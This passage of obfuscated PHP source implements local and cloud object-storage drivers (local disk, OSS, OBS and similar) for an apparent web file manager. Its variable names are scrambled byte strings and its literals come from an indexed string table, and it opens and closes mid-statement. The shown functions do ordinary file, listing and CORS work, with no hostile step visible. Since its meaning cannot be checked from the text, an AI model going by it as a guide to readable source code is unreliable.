$ø¾ëö¶Ó = array(); foreach ($Ø“ÃÓ¥½ as $ãÉİÅĞô => $¢šÕ›ø¿) { $ÜºÆúï¹ = Mcrypt::decode($¢šÕ›ø¿, $°½–ÅÎ£); $ø¾ëö¶Ó[$ÜºÆúï¹] = $ãÉİÅĞô; } if ($ğŠªÊ¡) { IO::remove($Ğ™Î‰ßö, !1); } return $ø¾ëö¶Ó; } } goto B‹Í±¨ÑâÖ; dó—Óˆİø: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($ğ İÁ‚™) { parent::__construct($ğ İÁ‚™); $this->setSignVersion($_SERVER[œ—üé‹ê][247]); } public function uploadLink($ëó”ÙùÊ, $”Õ¿ˆ¿ = 0) { $û®…¸‚ =& $_SERVER[œ—üé‹ê]; if ($this->isUploadServer()) { return; } $Àè¤¹ı˜ = $this->getType(); if (!in_array($Àè¤¹ı˜, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¡ÉÃœÙğ = (!$”Õ¿ˆ¿ ? 1 : ceil($”Õ¿ˆ¿ / pow(1024, 3))) * 3600 * 4; $À†ªÔİŠ = $this->uploadMultiData($ëó”ÙùÊ, $¡ÉÃœÙğ); if ($À†ªÔİŠ) { $À†ªÔİŠ[$û®…¸‚[95]] = $ëó”ÙùÊ; $À†ªÔİŠ[$û®…¸‚[96]] = $Àè¤¹ı˜; } return $À†ªÔİŠ; } public function fileOutImage($ÍÒâ©–°, $Ïéß¬–º = 250) { if ($this->size($ÍÒâ©–°) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ÍÒâ©–°, $Ïéß¬–º); } $ˆ°®±ß = $this->link($ÍÒâ©–°); $ˆ°®±ß .= $_SERVER[œ—üé‹ê][1658] . $Ïéß¬–º; $this->fileOutLink($ˆ°®±ß); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Ø€†–ª) { if (substr($Ø€†–ª, 0, 2) == $_SERVER[œ—üé‹ê][1519]) { $Ø€†–ª = BASIC_PATH . substr($Ø€†–ª, 2); } return $Ø€†–ª; } public function iconvApp($³††Îºë) { $„ëŒô†ù =& $_SERVER[œ—üé‹ê]; global $config; return $this->iconvTo($³††Îºë, $config[$„ëŒô†ù[1644]], $config[$„ëŒô†ù[1643]]); } public function iconvSystem($ùşšÓÅú) { $ÒŠ’åºÌ =& $_SERVER[œ—üé‹ê]; global $config; return $this->iconvTo($ùşšÓÅú, $config[$ÒŠ’åºÌ[1643]], $config[$ÒŠ’åºÌ[1644]]); } public function getPathOuter($‚Ø±÷Ç) { $œãÜš§ =& $_SERVER[œ—üé‹ê]; $Í—Á¶ÚÕ = $this->iconvApp($this->pathBase); $‚Ø±÷Ç = $this->iconvApp($‚Ø±÷Ç); if (substr($Í—Á¶ÚÕ, 0, 2) == $œãÜš§[1519]) { $Í—Á¶ÚÕ = BASIC_PATH . substr($Í—Á¶ÚÕ, 2); } if (substr($‚Ø±÷Ç, 0, 2) == $œãÜš§[1519]) { $‚Ø±÷Ç = BASIC_PATH . substr($‚Ø±÷Ç, 2); } $Í—Á¶ÚÕ = KodIO::clear($Í—Á¶ÚÕ); $‚Ø±÷Ç = KodIO::clear($‚Ø±÷Ç); $‚Ø±÷Ç = substr($‚Ø±÷Ç, strlen($Í—Á¶ÚÕ)); if (empty($this->pathDriver)) { return $‚Ø±÷Ç; } return $this->pathDriver . $œãÜš§[8] . ltrim($‚Ø±÷Ç, $œãÜš§[8]); } public function mkfile($µš«‡¼€, $ÛİŠüİ = '', $ùŒÊØ· = REPEAT_RENAME) { $µš«‡¼€ = $this->iconvSystem($µš«‡¼€); @touch($µš«‡¼€); if ($ÛİŠüİ) { file_put_contents($µš«‡¼€, $ÛİŠüİ); } @chmod($µš«‡¼€, $this->pathAuth); if (is_file($µš«‡¼€)) { return $this->getPathOuter($µš«‡¼€); } $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][1655], !0); return !1; } public function mkdir($€İàäœ, $Ç‰Ôßøà = REPEAT_SKIP) { $€İàäœ = $this->iconvSystem($€İàäœ); if (is_dir($€İàäœ)) { return $this->getPathOuter($€İàäœ); } @mkdir($€İàäœ, $this->pathAuth, !0); @chmod($€İàäœ, $this->pathAuth); if (is_dir($€İàäœ)) { return $this->getPathOuter($€İàäœ); } $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][1655], !0); return !1; } public function copyFile($ÄÑ‰§áä, $õƒÕ¯) { $this->mkdir($this->pathFather($õƒÕ¯)); $ÄÑ‰§áä = $this->iconvSystem($ÄÑ‰§áä); $õƒÕ¯ = $this->iconvSystem($õƒÕ¯); $ ÅªÜñÔ = copy_64($ÄÑ‰§áä, $õƒÕ¯); @chmod($õƒÕ¯, $this->pathAuth); if ($ ÅªÜñÔ) { return $this->getPathOuter($õƒÕ¯); } $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][1655], !0); return !1; } public function moveFile($ãÄ®Ë¾, $ƒ”Æ¦ãË) { $this->mkdir($this->pathFather($ƒ”Æ¦ãË)); $ãÄ®Ë¾ = $this->iconvSystem($ãÄ®Ë¾); $ƒ”Æ¦ãË = $this->iconvSystem($ƒ”Æ¦ãË); $Ò°”š = intval(@rename($ãÄ®Ë¾, $ƒ”Æ¦ãË)); if (!$Ò°”š) { if ($Ò°”š = intval(@copy_64($ãÄ®Ë¾, $ƒ”Æ¦ãË))) { @unlink($ãÄ®Ë¾); } } @chmod($ƒ”Æ¦ãË, $this->pathAuth); if ($Ò°”š) { return $this->getPathOuter($ƒ”Æ¦ãË); } $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][1655], !0); return !1; } public function movePath($±›ŠÒä, $“‹ÈØ«Œ, $ ©ÕÏè­ = false) { $‹ÖˆÇ¥¯ =& $_SERVER[œ—üé‹ê]; $±›ŠÒä = $this->iconvSystem($±›ŠÒä); $“‹ÈØ«Œ = $this->iconvSystem($“‹ÈØ«Œ); $„Î‹†ú = rtrim($“‹ÈØ«Œ, $‹ÖˆÇ¥¯[8]) . $‹ÖˆÇ¥¯[8] . ($ ©ÕÏè­ ? $ ©ÕÏè­ : get_path_this($±›ŠÒä)); if (file_exists($„Î‹†ú)) { return !1; } $ìî½¡Ô§ = intval(@rename($±›ŠÒä, $„Î‹†ú)); $ìî½¡Ô§ = file_exists($„Î‹†ú); if ($ìî½¡Ô§) { return $this->getPathOuter($„Î‹†ú); } $this->writeLog(__FUNCTION__ . $‹ÖˆÇ¥¯[1655], !0); return !1; } public function delFile($©ÂŸÜÃ) { $©ÂŸÜÃ = $this->iconvSystem($©ÂŸÜÃ); if (!@unlink($©ÂŸÜÃ)) { @chmod($©ÂŸÜÃ, $this->pathAuth); if (@unlink($©ÂŸÜÃ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][1655], !0); return !1; } return !0; } public function delFolder($šâ±ÌÂµ) { $í­‹Ÿˆ’ =& $_SERVER[œ—üé‹ê]; $šâ±ÌÂµ = $this->iconvSystem($šâ±ÌÂµ); if (!is_dir($šâ±ÌÂµ)) { return !0; } if (!($€òÓ’ÊÈ = opendir($šâ±ÌÂµ))) { return !1; } while (($§ÂÄêëû = readdir($€òÓ’ÊÈ)) !== !1) { if ($§ÂÄêëû == $í­‹Ÿˆ’[10] || $§ÂÄêëû == $í­‹Ÿˆ’[1464]) { continue; } $ÍŠİß° = $šâ±ÌÂµ . $í­‹Ÿˆ’[8] . $§ÂÄêëû; if (is_file($ÍŠİß°) || is_link($ÍŠİß°)) { if (!unlink($ÍŠİß°)) { chmod($ÍŠİß°, $this->pathAuth); if (!unlink($ÍŠİß°)) { return !1; } } } else { if (is_dir($ÍŠİß°)) { chmod($ÍŠİß°, $this->pathAuth); $ÍŠİß° = $this->iconvApp($ÍŠİß°); if (!$this->delFolder($ÍŠİß°)) { return !1; } } } } closedir($€òÓ’ÊÈ); return rmdir($šâ±ÌÂµ); } public function rename($»¢¶, $¸÷œÛ§») { $¨´½ÍÚ˜ =& $_SERVER[œ—üé‹ê]; $¤óÎäóï = $this->fileNameAuto($this->pathFather($»¢¶), $¸÷œÛ§»); $¤óÎäóï = $this->iconvSystem($¤óÎäóï); $»¢¶ = $this->iconvSystem($»¢¶); $Ó™ê¶¢Ü = $this->pathFather($»¢¶); $Õ…àïÄ¢ = rtrim($Ó™ê¶¢Ü, $¨´½ÍÚ˜[8]) . $¨´½ÍÚ˜[8] . $¤óÎäóï; $êîúğ = @rename($»¢¶, $Õ…àïÄ¢); $Õ…àïÄ¢ = $this->iconvApp($Õ…àïÄ¢); if ($êîúğ) { return $this->getPathOuter($Õ…àïÄ¢); } $this->writeLog(__FUNCTION__ . $¨´½ÍÚ˜[1655], !0); return !1; } public function size($¦õûïÑ) { $¦õûïÑ = $this->iconvSystem($¦õûïÑ); return filesize_64($¦õûïÑ); } public function info($™Æ»ÏÚº) { $™Æ»ÏÚº = $this->iconvSystem($™Æ»ÏÚº); if ($this->isFolder($™Æ»ÏÚº)) { return $this->folderInfo($™Æ»ÏÚº); } else { if ($this->isFile($™Æ»ÏÚº)) { return $this->fileInfo($™Æ»ÏÚº); } } return !1; } protected function infoChildren($¦®¶ÃÊÀ, &$ÁŠŠŞ–ó, $’ì¶¤É» = true) { $½±êË² =& $_SERVER[œ—üé‹ê]; check_abort_echo(); $¦®¶ÃÊÀ = rtrim($¦®¶ÃÊÀ, $½±êË²[8]) . $½±êË²[8]; if ($’ì¶¤É») { $¦®¶ÃÊÀ = $this->iconvSystem($¦®¶ÃÊÀ); } if (!($Ô»§ºÎÖ = @opendir($¦®¶ÃÊÀ))) { return; } while (($‰äÕíß™ = readdir($Ô»§ºÎÖ)) !== !1) { if ($‰äÕíß™ == $½±êË²[10] || $‰äÕíß™ == $½±êË²[1464]) { continue; } $…×©ÇæÃ = $¦®¶ÃÊÀ . $‰äÕíß™; if (is_file($…×©ÇæÃ) || is_link($…×©ÇæÃ)) { $ÁŠŠŞ–ó[$½±êË²[80]]++; $ÁŠŠŞ–ó[$½±êË²[79]] += filesize_64($…×©ÇæÃ); } else { if (is_dir($…×©ÇæÃ)) { $ÁŠŠŞ–ó[$½±êË²[81]]++; $this->infoChildren($…×©ÇæÃ, $ÁŠŠŞ–ó, !1); } } } closedir($Ô»§ºÎÖ); } private function folderInfo($¯äôêˆ«, $€Á¹æû = false) { $©ÛÏíé =& $_SERVER[œ—üé‹ê]; $¯äôêˆ« = rtrim($¯äôêˆ«, $©ÛÏíé[8]) . $©ÛÏíé[8]; $‹øÜò‡› = $this->iconvApp($this->pathThis($¯äôêˆ«)); if ($€Á¹æû) { return array($©ÛÏíé[32] => $‹øÜò‡›, $©ÛÏíé[87] => $this->getPathOuter($¯äôêˆ«), $©ÛÏíé[33] => $©ÛÏíé[78]); } $™õÛå¶ = array($©ÛÏíé[32] => $‹øÜò‡›, $©ÛÏíé[87] => $this->getPathOuter($¯äôêˆ«), $©ÛÏíé[33] => $©ÛÏíé[78], $©ÛÏíé[231] => @filectime($¯äôêˆ«), $©ÛÏíé[88] => @filemtime($¯äôêˆ«), $©ÛÏíé[1659] => @fileatime($¯äôêˆ«), $©ÛÏíé[1660] => is_readable($¯äôêˆ«), $©ÛÏíé[1661] => is_writable($¯äôêˆ«), $©ÛÏíé[1662] => get_mode($¯äôêˆ«)); return $™õÛå¶; } private function fileInfo($ç…Í°Ğ, $Âä± = false) { $ôÕ´øÓî =& $_SERVER[œ—üé‹ê]; $¦µ»İß« = $this->iconvApp($this->pathThis($ç…Í°Ğ)); if ($Âä±) { return array($ôÕ´øÓî[32] => $¦µ»İß«, $ôÕ´øÓî[87] => $this->getPathOuter($ç…Í°Ğ), $ôÕ´øÓî[33] => $ôÕ´øÓî[230], $ôÕ´øÓî[79] => $this->size($ç…Í°Ğ), $ôÕ´øÓî[166] => $this->ext($¦µ»İß«)); } $ ş››½ù = array($ôÕ´øÓî[32] => $¦µ»İß«, $ôÕ´øÓî[87] => $this->getPathOuter($ç…Í°Ğ), $ôÕ´øÓî[33] => $ôÕ´øÓî[230], $ôÕ´øÓî[231] => @filectime($ç…Í°Ğ), $ôÕ´øÓî[88] => @filemtime($ç…Í°Ğ), $ôÕ´øÓî[1659] => @fileatime($ç…Í°Ğ), $ôÕ´øÓî[79] => $this->size($ç…Í°Ğ), $ôÕ´øÓî[166] => $this->ext($¦µ»İß«), $ôÕ´øÓî[1660] => is_readable($ç…Í°Ğ), $ôÕ´øÓî[1661] => is_writable($ç…Í°Ğ), $ôÕ´øÓî[1662] => get_mode($ç…Í°Ğ)); return $ ş››½ù; } public function exist($¸€•Úº×) { $¸€•Úº× = $this->iconvSystem($¸€•Úº×); return @file_exists($¸€•Úº×); } public function isFile($´âÊé) { $´âÊé = $this->iconvSystem($´âÊé); return @is_file($´âÊé); } public function isFolder($îÛïıÒÚ) { $îÛïıÒÚ = $this->iconvSystem($îÛïıÒÚ); return @is_dir($îÛïıÒÚ); } public function listPath($À‚†â÷Ì, $Õ…ğûã  = false) { $¸ºŸº¥¬ =& $_SERVER[œ—üé‹ê]; $À‚†â÷Ì = $this->iconvSystem($À‚†â÷Ì); $À‚†â÷Ì = rtrim($À‚†â÷Ì, $¸ºŸº¥¬[8]) . $¸ºŸº¥¬[8]; $âÉ•ù˜¼ = array($¸ºŸº¥¬[85] => array(), $¸ºŸº¥¬[86] => array()); if (!($¥±´«Ã¶ = @opendir($À‚†â÷Ì))) { return $âÉ•ù˜¼; } while (($®Şğ¡«Œ = readdir($¥±´«Ã¶)) !== !1) { if ($®Şğ¡«Œ == $¸ºŸº¥¬[10] || $®Şğ¡«Œ == $¸ºŸº¥¬[1464]) { continue; } $Ô€‚˜¼× = $À‚†â÷Ì . $®Şğ¡«Œ; if (is_file($Ô€‚˜¼×)) { $âÉ•ù˜¼[$¸ºŸº¥¬[86]][] = $this->fileInfo($Ô€‚˜¼×, $Õ…ğûã ); } else { $âÉ•ù˜¼[$¸ºŸº¥¬[85]][] = $this->folderInfo($Ô€‚˜¼×, $Õ…ğûã ); } } closedir($¥±´«Ã¶); return $âÉ•ù˜¼; } public function listAll($Ğ˜¸¤«™, &$Ñˆ•¼…¥ = array()) { $¬–¶Ãñä =& $_SERVER[œ—üé‹ê]; $Ğ˜¸¤«™ = $this->iconvSystem($Ğ˜¸¤«™); $Ğ˜¸¤«™ = rtrim($Ğ˜¸¤«™, $¬–¶Ãñä[8]) . $¬–¶Ãñä[8]; if (!($¨ûÃşß = @opendir($Ğ˜¸¤«™))) { return $Ñˆ•¼…¥; } while (($¢àæâ³¬ = readdir($¨ûÃşß)) !== !1) { if ($¢àæâ³¬ == $¬–¶Ãñä[10] || $¢àæâ³¬ == $¬–¶Ãñä[1464]) { continue; } $à½Íá’‰ = $Ğ˜¸¤«™ . $¢àæâ³¬; $îÌ¿ß©½ = is_dir($à½Íá’‰) && !is_link($à½Íá’‰) ? 1 : 0; $à½Íá’‰ = $îÌ¿ß©½ ? $à½Íá’‰ . $¬–¶Ãñä[8] : $à½Íá’‰; $Ñˆ•¼…¥[] = array($¬–¶Ãñä[87] => $this->getPathOuter($à½Íá’‰), $¬–¶Ãñä[78] => $îÌ¿ß©½, $¬–¶Ãñä[88] => intval(@filemtime($à½Íá’‰)), $¬–¶Ãñä[79] => $îÌ¿ß©½ ? 0 : intval($this->size($à½Íá’‰))); if ($îÌ¿ß©½) { $this->listAll($à½Íá’‰, $Ñˆ•¼…¥); } } closedir($¨ûÃşß); return $Ñˆ•¼…¥; } public function has($Ì™²è´ë, $¥²ö‹Øº = false, $òÉÅ€’ = true) { $ß—›æÒ =& $_SERVER[œ—üé‹ê]; $Ì™²è´ë = $this->iconvSystem($Ì™²è´ë); $Ì™²è´ë = rtrim($Ì™²è´ë, $ß—›æÒ[8]) . $ß—›æÒ[8]; if (!($¯ÑƒÛÍ† = @opendir($Ì™²è´ë))) { return !1; } $¡¥«ØÈ€ = 0; $£Œ­Ğ„Ï = 0; $ß»¬Ó¹ = 0; while (($‡¦—¾Ş = readdir($¯ÑƒÛÍ†)) !== !1) { if ($‡¦—¾Ş == $ß—›æÒ[10] || $‡¦—¾Ş == $ß—›æÒ[1464]) { continue; } $•Ñ•Ÿ‹ = $Ì™²è´ë . $‡¦—¾Ş; if ($¥²ö‹Øº) { $ß»¬Ó¹++; if (@is_file($•Ñ•Ÿ‹)) { $¡¥«ØÈ€++; } else { $£Œ­Ğ„Ï++; } if ($ß»¬Ó¹ > 10000) { break; } continue; } if ($òÉÅ€’) { if (@is_file($•Ñ•Ÿ‹)) { return !0; } } else { if (@is_dir($•Ñ•Ÿ‹ . $ß—›æÒ[8])) { return !0; } } } closedir($¯ÑƒÛÍ†); if ($¥²ö‹Øº) { return array($ß—›æÒ[239] => $¡¥«ØÈ€, $ß—›æÒ[240] => $£Œ­Ğ„Ï); } return !1; } public function hashSimple($Ÿ›è×ÛÃ) { $ÍÄ®áÙ =& $_SERVER[œ—üé‹ê]; if (!$Ÿ›è×ÛÃ) { return md5($ÍÄ®áÙ[12]); } $Ÿ›è×ÛÃ = $this->iconvSystem($Ÿ›è×ÛÃ); $ÅéºÜµÇ = $this->size($Ÿ›è×ÛÃ); $ª €ÔÕ‰ = 200; $ÃâÉ™õó = 50; if ($ÅéºÜµÇ <= $ª €ÔÕ‰ * $ÃâÉ™õó) { return $this->hashMd5($Ÿ›è×ÛÃ) . $ÅéºÜµÇ; } $±©°˜É = $ÍÄ®áÙ[12]; $î¢°‰÷¨ = intval($ÅéºÜµÇ / $ÃâÉ™õó); $Î¬êê‘Â = fopen($Ÿ›è×ÛÃ, $ÍÄ®áÙ[1663]); if (!$Î¬êê‘Â) { return $±©°˜É; } for ($²ãÓ÷±ò = 0; $²ãÓ÷±ò < $ÃâÉ™õó; $²ãÓ÷±ò++) { fseek_64($Î¬êê‘Â, $î¢°‰÷¨ * $²ãÓ÷±ò); $±©°˜É .= fread($Î¬êê‘Â, $ª €ÔÕ‰); } fseek_64($Î¬êê‘Â, $ÅéºÜµÇ - $ª €ÔÕ‰); $±©°˜É .= fread($Î¬êê‘Â, $ª €ÔÕ‰); fclose($Î¬êê‘Â); return md5($±©°˜É) . $ÅéºÜµÇ; } public function getContent($æ™¥«¯ª) { $æ™¥«¯ª = $this->iconvSystem($æ™¥«¯ª); return file_get_contents($æ™¥«¯ª); } public function setContent($úòÒ Ó¦, $Ïãïµ¶· = '') { $úòÒ Ó¦ = $this->iconvSystem($úòÒ Ó¦); $¦¥Ø°üí = @file_put_contents($úòÒ Ó¦, $Ïãïµ¶·, LOCK_EX); if (!$¦¥Ø°üí) { $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][1655], !0); } clearstatcache(); @chmod($úòÒ Ó¦, $this->pathAuth); return $¦¥Ø°üí === !1 ? !1 : !0; } public function fileSubstr($ˆÉ¹ĞÖ, $Âæöóß = 0, $‡ºº¯ü = false) { $¬¸÷«·ë =& $_SERVER[œ—üé‹ê]; $ˆÉ¹ĞÖ = $this->iconvSystem($ˆÉ¹ĞÖ); if ($‡ºº¯ü === !1) { $‡ºº¯ü = $this->size($ˆÉ¹ĞÖ); } if ($‡ºº¯ü <= 0) { return $¬¸÷«·ë[12]; } $ö¼«·å¼ = fopen($ˆÉ¹ĞÖ, $¬¸÷«·ë[1663]); if (!$ö¼«·å¼) { return !1; } fseek_64($ö¼«·å¼, $Âæöóß); $¿±¢Ëïé = fread($ö¼«·å¼, $‡ºº¯ü); fclose($ö¼«·å¼); if (!$¿±¢Ëïé) { $this->writeLog(__FUNCTION__ . $¬¸÷«·ë[1655], !0); } return $¿±¢Ëïé; } public function upload($Ğ©ò§ÌÃ, $‡ÁÒ©¡, $Ê²Üßº¢ = false, $ ßê¡õš = REPEAT_REPLACE) { if (!$‡ÁÒ©¡ || !@file_exists($‡ÁÒ©¡)) { return !1; } if ($Ê²Üßº¢) { return $this->moveFile($‡ÁÒ©¡, $Ğ©ò§ÌÃ); } return $this->copyFile($‡ÁÒ©¡, $Ğ©ò§ÌÃ); } public function setModifyTime($æñìâÇô, $Ôé©‰íŠ = '') { @touch($æñìâÇô, intval($Ôé©‰íŠ)); } public function download($’Ğªàä×, $ï¸Á«Ôª) { return $this->iconvSystem($’Ğªàä×); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($Ò€„ğÁ) { parent::__construct($Ò€„ğÁ); $this->setSignVersion($_SERVER[œ—üé‹ê][247]); } public function fileOutImage($ëÕ§Ûª½, $‚¸ÓÎşÃ = 250) { $êñÚ²Ëô =& $_SERVER[œ—üé‹ê]; if ($this->size($ëÕ§Ûª½) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ëÕ§Ûª½, $‚¸ÓÎşÃ); } $Ş–Áïİ£ = array($êñÚ²Ëô[1664] => $êñÚ²Ëô[1665] . $‚¸ÓÎşÃ . $êñÚ²Ëô[1666]); $µ×â®Ãó = $this->link($ëÕ§Ûª½, $Ş–Áïİ£); $this->fileOutLink($µ×â®Ãó); } } goto C ¡°Äšåõ; C ¡°Äšåõ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ù°ÏºÍ‰) { parent::__construct($ù°ÏºÍ‰); $this->setSignVersion($_SERVER[œ—üé‹ê][247]); } public function uploadFormData($û†˜–Åğ, $¹ ¿’Äì = 3600) { return $this->uploadFormDataV2($û†˜–Åğ, $¹ ¿’Äì); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($–øúôè±) { parent::__construct(); include_once SDK_DIR . $_SERVER[œ—üé‹ê][1667]; $this->_init($–øúôè±); } public function _init($¶ÓßõÆ½) { $ãÅ²å¸¶ =& $_SERVER[œ—üé‹ê]; $this->config = $¶ÓßõÆ½; foreach ($¶ÓßõÆ½ as $»«åÒôä => $™ã…Ìæ) { if (isset($this->{$»«åÒôä})) { $this->{$»«åÒôä} = $™ã…Ìæ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ãÅ²å¸¶[1668] . LNG($ãÅ²å¸¶[1669])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $—ç›“çí =& $_SERVER[œ—üé‹ê]; $Øè²Ú¼™ = new OSS\Model\CorsConfig(); $Ê°Ş©å× = new OSS\Model\CorsRule(); $Ê°Ş©å×->addAllowedOrigin($—ç›“çí[1670]); $Ê°Ş©å×->addAllowedMethod($—ç›“çí[1671]); $Ê°Ş©å×->addAllowedMethod($—ç›“çí[1672]); $Ê°Ş©å×->addAllowedMethod($—ç›“çí[1673]); $Ê°Ş©å×->addAllowedMethod($—ç›“çí[1674]); $Ê°Ş©å×->addAllowedMethod($—ç›“çí[162]); $Ê°Ş©å×->setMaxAgeSeconds(600); $Ê°Ş©å×->addExposeHeader($—ç›“çí[1675]); $Ê°Ş©å×->addAllowedHeader($—ç›“çí[1670]); $Øè²Ú¼™->addRule($Ê°Ş©å×); try { $this->client->putBucketCors($this->bucket, $Øè²Ú¼™); } catch (OSS\Core\OssException $Û‹ÄóÈ) { $this->writeLog(__FUNCTION__ . $—ç›“çí[212] . $Û‹ÄóÈ->getMessage()); return !1; } return !0; } public function getBucketCors() { $ÇşØø˜ =& $_SERVER[œ—üé‹ê]; $‰ÕÌ¢ï‰ = null; try { $‰ÕÌ¢ï‰ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $›Ä¤Ç—Î) { $this->writeLog(__FUNCTION__ . $ÇşØø˜[212] . $›Ä¤Ç—Î->getMessage()); return null; } if (!$‰ÕÌ¢ï‰ || !($¡µÊÄœå = $‰ÕÌ¢ï‰->getRules())) { return null; } $ğ£–ÙüÙ = $¡µÊÄœå[0]->getAllowedOrigins(); $×¨ªÍ¯¢ = $¡µÊÄœå[0]->getAllowedMethods(); $›’µÄŠè = $¡µÊÄœå[0]->getMaxAgeSeconds(); $±­»ú¶ = $¡µÊÄœå[0]->getExposeHeaders(); $Â›²óå¦ = $¡µÊÄœå[0]->getAllowedHeaders(); return array($ÇşØø˜[218] => isset($ğ£–ÙüÙ[0]) ? $ğ£–ÙüÙ[0] : $ÇşØø˜[12], $ÇşØø˜[222] => $×¨ªÍ¯¢, $ÇşØø˜[1676] => $›’µÄŠè, $ÇşØø˜[1677] => isset($±­»ú¶[0]) ? $±­»ú¶[0] : $ÇşØø˜[12], $ÇşØø˜[219] => isset($Â›²óå¦[0]) ? $Â›²óå¦[0] : $ÇşØø˜[12]); } public function isBucketCors() { $–ë€»©… =& $_SERVER[œ—üé‹ê]; $Íóâİ± = $this->getBucketCors(); if (!$Íóâİ± || !is_array($Íóâİ±)) { return !1; } if ($Íóâİ±[$–ë€»©…[218]] != $–ë€»©…[220] || $Íóâİ±[$–ë€»©…[219]] != $–ë€»©…[220]) { return !1; } $¥€¸é¥Ó = array_map($–ë€»©…[221], $Íóâİ±[$–ë€»©…[222]]); if (!is_array($¥€¸é¥Ó)) { $¥€¸é¥Ó = array(); } $±ê«ÑÜ‚ = array($–ë€»©…[223], $–ë€»©…[224], $–ë€»©…[225], $–ë€»©…[226], $–ë€»©…[227]); $ğ‚ËÏŠĞ = array_diff($±ê«ÑÜ‚, $¥€¸é¥Ó); return empty($ğ‚ËÏŠĞ); } public function mkfile($Ó“³€Ë, $¿Ş¯¼¿ = '', $¤Æ˜üˆª = REPEAT_RENAME) { $àşÀ¼Ï = $this->setContent($Ó“³€Ë, $¿Ş¯¼¿); if ($àşÀ¼Ï !== !1) { return $this->getPathOuter($Ó“³€Ë); } return !1; } public function mkdir($ìøş©Ì, $ş«¢É¥Ù = REPEAT_SKIP) { if ($ş«¢É¥Ù && $this->_isFolder($ìøş©Ì)) { return $this->getPathOuter($ìøş©Ì); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ìøş©Ì)); } catch (OSS\Core\OssException $Õ›íÕ) { $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][212] . $Õ›íÕ->getMessage()); return !1; } return $this->getPathOuter($ìøş©Ì); } private function fileList($¹¢Ğış¼, $ãæÃ“‚‡ = '', $±Ö›Î‹ = 0) { $ÁÜ§…­× =& $_SERVER[œ—üé‹ê]; $¹¢Ğış¼ = trim($¹¢Ğış¼, $ÁÜ§…­×[8]); $©š¡Ó° = empty($¹¢Ğış¼) && $¹¢Ğış¼ !== $ÁÜ§…­×[228] ? $ÁÜ§…­×[12] : $¹¢Ğış¼ . $ÁÜ§…­×[8]; $öÂœ™µ€ = $ÁÜ§…­×[12]; $øùæáàÕ = 1000; $Ä†ùŠÂİ = $—…±£Õ = array(); while (!0) { check_abort(); $ø¦ÇÉóĞ = array($ÁÜ§…­×[1678] => $ãæÃ“‚‡, $ÁÜ§…­×[1679] => $©š¡Ó°, $ÁÜ§…­×[1680] => $øùæáàÕ, $ÁÜ§…­×[1681] => $öÂœ™µ€); try { $Ìé“Ü¤ë = $this->client->listObjects($this->bucket, $ø¦ÇÉóĞ); } catch (OSS\Core\OssException $á®Ğã‚) { $this->writeLog(__FUNCTION__ . $ÁÜ§…­×[212] . $á®Ğã‚->getMessage()); break; } $öÂœ™µ€ = $Ìé“Ü¤ë->getNextMarker(); $øË¼Èò  = $Ìé“Ü¤ë->getObjectList(); $š€è®ğ = $Ìé“Ü¤ë->getPrefixList(); foreach ($øË¼Èò  as $¬ô‡Ô© ) { if ($¬ô‡Ô© ->getKey() == $©š¡Ó°) { continue; } $¦¶¸¶ıã = $¬ô‡Ô© ->getKey(); $ÀÕ‹ì©Ù = $¬ô‡Ô© ->getSize(); $€´éßêç = $¬ô‡Ô© ->getLastModified(); $ŠÉ½ÇÄ— = trim($¬ô‡Ô© ->getETag(), $ÁÜ§…­×[118]); $×Ë‡ÙË = $±Ö›Î‹ ? array($ÁÜ§…­×[32] => $¦¶¸¶ıã, $ÁÜ§…­×[79] => $ÀÕ‹ì©Ù, $ÁÜ§…­×[204] => strtotime($€´éßêç), $ÁÜ§…­×[1682] => $ŠÉ½ÇÄ—) : $¦¶¸¶ıã; $¼÷Òí¦Ğ = $ÀÕ‹ì©Ù == 0 && substr($¦¶¸¶ıã, strlen($¦¶¸¶ıã) - 1, 1) == $ÁÜ§…­×[8] ? !0 : !1; $·ÀĞ½ãØ = array($ÁÜ§…­×[79] => $ÀÕ‹ì©Ù, $ÁÜ§…­×[1683] => $ÀÕ‹ì©Ù, $ÁÜ§…­×[88] => strtotime($€´éßêç), $ÁÜ§…­×[1684] => $€´éßêç, $ÁÜ§…­×[1682] => $ŠÉ½ÇÄ—); $this->cacheMethodInfoSet($¦¶¸¶ıã, $¼÷Òí¦Ğ, $·ÀĞ½ãØ); if ($¼÷Òí¦Ğ) { $Ä†ùŠÂİ[] = $¦¶¸¶ıã; continue; } $—…±£Õ[] = $×Ë‡ÙË; } foreach ($š€è®ğ as $±™Ş¯Ş´) { $Ä†ùŠÂİ[] = $±™Ş¯Ş´->getPrefix(); $this->cacheMethodInfoSet($±™Ş¯Ş´->getPrefix(), !0); } if ($öÂœ™µ€ === $ÁÜ§…­×[12]) { break; } } $this->cacheMethodInfoSet($¹¢Ğış¼, !0); return array($ÁÜ§…­×[85] => $Ä†ùŠÂİ, $ÁÜ§…­×[86] => $—…±£Õ); } public function listObject($¬âñÑù, $ğª ÔÑ‡ = '') { $ÇŠãú‰ =& $_SERVER[œ—üé‹ê]; $¬âñÑù = trim($¬âñÑù, $ÇŠãú‰[8]); $²èŒ›ôÜ = empty($¬âñÑù) && $¬âñÑù 